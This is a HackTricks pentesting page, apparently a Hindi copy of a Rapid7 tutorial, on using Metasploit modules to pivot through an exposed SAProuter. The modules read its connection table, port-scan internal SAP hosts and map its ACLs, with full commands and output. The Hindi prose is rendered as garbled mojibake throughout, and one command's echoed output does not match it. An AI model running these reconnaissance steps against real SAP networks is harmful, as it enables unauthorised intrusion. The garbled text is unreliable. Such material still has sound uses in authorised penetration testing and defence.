<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>


рдХреЙрдкреА: [https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/](https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/)
```text
PORT     STATE SERVICE    VERSION
3299/tcp open  saprouter?
```
# Metasploit рдХреЗ рд╕рд╛рде SAProuter рдХреЛ рднреЗрджрдирд╛

Saprouter рдореВрд▓ рд░реВрдк рд╕реЗ SAP рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА рд╣реИ, рдЬреЛ рдЖрдорддреМрд░ рдкрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдФрд░ рдЖрдВрддрд░рд┐рдХ SAP рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рдмреАрдЪ рд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рд╣реЛрд╕реНрдЯреНрд╕ рд╕реЗ рдЖрдВрддрд░рд┐рдХ SAP рд╕рд┐рд╕реНрдЯрдореЛрдВ рддрдХ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ SAP рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЕрдзрд┐рдХ рд╕реВрдХреНрд╖реНрдо рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рдпрд╣ рд╣реИ рдХрд┐ saprouter рдЖрдорддреМрд░ рдкрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдХреЗ рд▓рд┐рдП рдЙрдЬрд╛рдЧрд░ рд╣реЛрддрд╛ рд╣реИ, рд╕рдВрдЧрдарди рдХреЗ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдкрд░ saprouter рд╣реЛрд╕реНрдЯ рдХреЗ рд▓рд┐рдП рдЗрдирдмрд╛рдЙрдВрдб TCP рдкреЛрд░реНрдЯ 3299 рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдХрд░ред рдФрд░ saprouter рд╕реЗ, рдХрдо рд╕реЗ рдХрдо рдПрдХ рдЖрдВрддрд░рд┐рдХ SAP рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдБрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдЗрд╕реЗ рдПрдХ рдмрд╣реБрдд рд╣реА рджрд┐рд▓рдЪрд╕реНрдк рд▓рдХреНрд╖реНрдп рдмрдирд╛рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ тАЬрдЙрдЪреНрдЪ рдореВрд▓реНрдптАЭ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд╛ рдПрдХ рдорд╛рд░реНрдЧ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд┐рддреНрд░ рдПрдХ рдореВрд▓ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрдЯрдЕрдк рджрд┐рдЦрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣рдо рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВрдЧреЗ:

![](https://blog.rapid7.com/content/images/post-images/33923/image1.jpg)

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рд╣рдо рдЙрдЬрд╛рдЧрд░ IP рдкрддреЗ рдХрд╛ SAP рд╕реЗрд╡рд╛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [`sap_service_discovery`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery) рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, 1.2.3.101ред
```text
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_service_discovery) > run

[*] [SAP] Beginning service Discovery '1.2.3.101'

[+] 1.2.3.101:3299      - SAP Router OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
рд╕реНрдХреИрди рд╕реЗ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рд╣реЛрд╕реНрдЯ TCP 3299 рдкреЛрд░реНрдЯ рдкрд░ SAP рд░рд╛рдЙрдЯрд░ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИред рдЕрдм рд╣рдо рдФрд░ рдЧрд╣рд░рд╛рдИ рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ saprouter рд╕реЗ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдЧрд░ рдЗрд╕реЗ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдФрд░ рдЕрдХреНрд╕рд░ рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдВрддрд░рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд╕реНрдерд╛рдкрд┐рдд рдХрдиреЗрдХреНрд╢рдиред рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рд╣рдо [`sap_router_info_request`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request) рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ:
```text
msf auxiliary(sap_router_info_request) > use auxiliary/scanner/sap/sap_router_info_request
msf auxiliary(sap_router_info_request) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_router_info_request) > run

[+] 1.2.3.101:3299 - Connected to saprouter
[+] 1.2.3.101:3299 - Sending ROUTER_ADM packet info request
[+] 1.2.3.101:3299 - Got INFO response
[+] Working directory   : /opt/sap
[+] Routtab             : ./saprouttab

[SAP] SAProuter Connection Table for 1.2.3.101
===================================================

Source        Destination   Service
------        -----------   -------
1.2.3.12      192.168.1.18  3200


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
рдЖрдЙрдЯрдкреБрдЯ рд╕реЗ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдХреЛрдИ \(1.2.3.12\) рдПрдХ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ \(192.168.1.18\) рд╕реЗ рдкреЛрд░реНрдЯ 3200 рдкрд░ рдЬреБрдбрд╝рд╛ рд╣реБрдЖ рд╣реИред рдкреЛрд░реНрдЯ 3200 рдПрдХ рд╕рд╛рдорд╛рдиреНрдп SAP рдкреЛрд░реНрдЯ рд╣реИ рдЬреЛ DIAG рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ \(рдпрд╣реАрдВ SAP GUI рдПрдкреНрд▓рд┐рдХреЗрд╢рди SAP рд╕рд░реНрд╡рд░реНрд╕ рд╕реЗ рдЬреБрдбрд╝рддрд╛ рд╣реИ\)ред рд╣рдореЗрдВ рдЖрдВрддрд░рд┐рдХ IP рдкрддреЗ рдХреА рдпреЛрдЬрдирд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рднреА рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓рддреА рд╣реИ, рд╡реЗ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдХрдо рд╕реЗ рдХрдо 192.168.1.0/24 рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдпрд╛ рдЙрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдХреЛрдИ рдЙрдкрдиреЗрдЯред

**рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрд╕рдВрдзрд╛рди**

рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рд╣рдо рдЕрдм рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдХреА рд╕реНрдХреИрдирд┐рдВрдЧ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЪреВрдВрдХрд┐ saprouter рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдХреА рддрд░рд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рд╣рдо рдЗрд╕рд╕реЗ рдЬреБрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВрдЧреЗ рдФрд░ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдФрд░ рдкреЛрд░реНрдЯреНрд╕ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВрдЧреЗ, рдФрд░ saprouter рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рджреЗрдЦреЗрдВрдЧреЗред рдпрд╣ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕, рд╕реЗрд╡рд╛рдУрдВ рдФрд░ ACLs рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ saprouter рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред рд╣рдо рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП [`sap_router_portscanner`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner) рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред

рдореЙрдбреНрдпреВрд▓ saprouter рд╕реЗ рдЬреБрдбрд╝рддрд╛ рд╣реИ рдФрд░ рдЕрдиреНрдп рд╣реЛрд╕реНрдЯреНрд╕ \(TARGETS рд╡рд┐рдХрд▓реНрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд\) рд╕реЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ TCP рдкреЛрд░реНрдЯреНрд╕ рдкрд░ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред рдлрд┐рд░ рдпрд╣ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИ, рдФрд░ рд╕рдордЭрддрд╛ рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдзрд┐рдд рдХрдиреЗрдХреНрд╢рди рд╕рдВрднрд╡ рд╣реИ рдпрд╛ рдирд╣реАрдВред рдЗрд╕ рдореЙрдбреНрдпреВрд▓ рдореЗрдВ рдХреБрдЫ рд╡рд┐рдХрд▓реНрдк рд╣реЛрддреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```text
Basic options:
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-99            no        SAP instance numbers to scan (NN in PORTS definition)
MODE         SAP_PROTO        yes       Connection Mode: SAP_PROTO or TCP  (accepted: SAP_PROTO, TCP)
PORTS        32NN             yes       Ports to scan (e.g. 3200-3299,5NN13)
RESOLVE      local            yes       Where to resolve TARGETS (accepted: remote, local)
RHOST                         yes       SAPRouter address
RPORT        3299             yes       SAPRouter TCP port
TARGETS                       yes       Comma delimited targets. When resolution is local address ranges or CIDR identifiers allowed.
```
рдХрдо рд╕реЗ рдХрдо рдЖрдкрдХреЛ saprouter рдХрд╛ IP рдкрддрд╛ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдЙрджрд╛рд╣рд░рдг рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, 1.2.3.101ред рдлрд┐рд░, TARGETS рдХреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдЪреНрдЫрд┐рдд рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрддреЛрдВ рдХреЗ рд╕рд╛рде рд╕реЗрдЯ рдХрд░реЗрдВ, рдФрд░ рдЕрдВрдд рдореЗрдВ PORTS рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП TCP рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд╕реЗрдЯ рдХрд░реЗрдВред

рдореЙрдбреНрдпреВрд▓ INSTANCES рд╡рд┐рдХрд▓реНрдк рднреА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ PORTS рд╡рд┐рдХрд▓реНрдк рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд╕рд░рд▓ рдмрдирд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред SAP рд╕реНрдерд╛рдкрдирд╛рдПрдВ рдПрдХрд╛рдзрд┐рдХ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИрдВ, рдЬреЛ рд╕рдорд╛рди рд╕реЗрд╡рд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдкреНрд░рддреНрдпреЗрдХ рдЙрджрд╛рд╣рд░рдг рдХреЛ TCP рдкреЛрд░реНрдЯреНрд╕ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, SAP рдЙрджрд╛рд╣рд░рдг 00 рдХреЗ рдкрд╛рд╕ SAP рдбрд┐рд╕реНрдкреИрдЪрд░ рд╕реЗрд╡рд╛ \(рдЬрд╣рд╛рдВ SAP GUI рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ\) рдкреЛрд░реНрдЯ 3200 рдкрд░ рд╣реЛрдЧреА рдФрд░ рдЙрджрд╛рд╣рд░рдг 01 рдкреЛрд░реНрдЯ 3201 рдкрд░ рд╣реЛрдЧрд╛ред PORTS рд╡рд┐рдХрд▓реНрдк рдореЗрдВ рдПрдХ тАЬрд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдбтАЭ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬреЛ тАЬNNтАЭ рд╣реИ рдЬрд┐рд╕реЗ рдЙрджрд╛рд╣рд░рдг рд╕рдВрдЦреНрдпрд╛ рдХреЗ рд╕рд╛рде рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╕рднреА рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдкреЛрд░реНрдЯреНрд╕ рд╕реНрдХреИрди рдХрд░рдирд╛ред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рд╣рдо 00 рд╕реЗ 50 рддрдХ рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рд╣рдо INSTANCES рдФрд░ PORTS рдЪрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```text
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-50
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
```
рдЗрд╕ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдореЙрдбреНрдпреВрд▓ 3200 рд╕реЗ 3250 рддрдХ рдХреА рд░реЗрдВрдЬ рдореЗрдВ рдкреЛрд░реНрдЯреНрд╕ рд╕реНрдХреИрди рдХрд░реЗрдЧрд╛ред

рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕реЛрд░реНрд╕ рдореЗрдВ рдЖрдкрдХреЛ SAP рд╕рд┐рд╕реНрдЯрдореНрд╕ рдкрд░ рдЖрдо рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣рдо рдЕрдм рд╕реНрдХреИрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВрдЧреЗ:
```text
msf > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > set RHOST 1.2.3.101
RHOST => 1.2.3.101
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.18
TARGETS => 192.168.1.18
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
PORTS => 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host           Port   State   Info
----           ----   -----   ----
192.168.1.18   3201   closed  SAP Dispatcher sapdp01
192.168.1.18   3200   open    SAP Dispatcher sapdp00
192.168.1.18   50013  open    SAP StartService [SOAP] sapctrl00

[*] Auxiliary module execution completed
```
рд╣рдо VERBOSE рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рд╕рдордЭрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреБрдЫ рдХрдиреЗрдХреНрд╢рди saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреНрдпреЛрдВ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИрдВред рдЬрдм VERBOSE рдХреЛ true рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо saprouter рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдЦ рдкрд╛рддреЗ рд╣реИрдВ, рдФрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд ACL рдХреЛ рдореИрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╣рдо рдЕрдм 192.168.1.18 рдФрд░ 192.168.1.1 рд╣реЛрд╕реНрдЯреНрд╕ рдХреЛ рд╕реНрдХреИрди рдХрд░реЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рдкреЛрд░реНрдЯ 3200 рдкрд░, рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рд╣рдо рджреЛрдиреЛрдВ SAP рдбрд┐рд╕реНрдкреИрдЪрд░реНрд╕ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```text
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.1,192.168.1.18
TARGETS => 192.168.1.1,192.168.1.18
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State   Info
----          ----  -----   ----
192.168.1.18  3200  open  SAP Dispatcher sapdp00

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[!] Warning: Service info could be inaccurate
[*] Auxiliary module execution completed
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдореЗрдВ рдпрд╣ рднреА рдкрддрд╛ рдЪрд▓ рдЧрдпрд╛ рд╣реИ рдХрд┐ рд╣рдо рдЕрдиреНрдп рд╣реЛрд╕реНрдЯ рд╕реЗ рдкреЛрд░реНрдЯ 3200 рдкрд░ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ saprouter рдкрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд ACL рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реБрджреНрдз рд╣реИред

**ACLs рдХрд╛ рдореИрдкрд┐рдВрдЧ**

saprouter рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рджреЛ рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ:

* рдиреЗрдЯрд┐рд╡ тАУ рдпреЗ рд╕рд╛рдзрд╛рд░рдг TCP рдХрдиреЗрдХреНрд╢рди рд╣реЛрддреЗ рд╣реИрдВ;
* SAP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ тАУ рдпреЗ TCP рдХрдиреЗрдХреНрд╢рди рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд╕рд╛рде рд╣реЛрддреЗ рд╣реИрдВ, рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╕рднреА рд╕рдВрджреЗрд╢ 4 рдмрд╛рдЗрдЯреНрд╕ рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдЧреЗ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреА рд▓рдВрдмрд╛рдИ рдХреЛ рджрд░реНрд╢рд╛рддреЗ рд╣реИрдВред

SAP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ saprouter рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╣реИ, рдФрд░ рдпрд╣реА рд╡рд╣ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ SAP GUI рдХрд░рддрд╛ рд╣реИ SAP DIAG рдкреЛрд░реНрдЯ рд╕реЗ saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдиреЗрдЯрд┐рд╡ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХреЛ saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

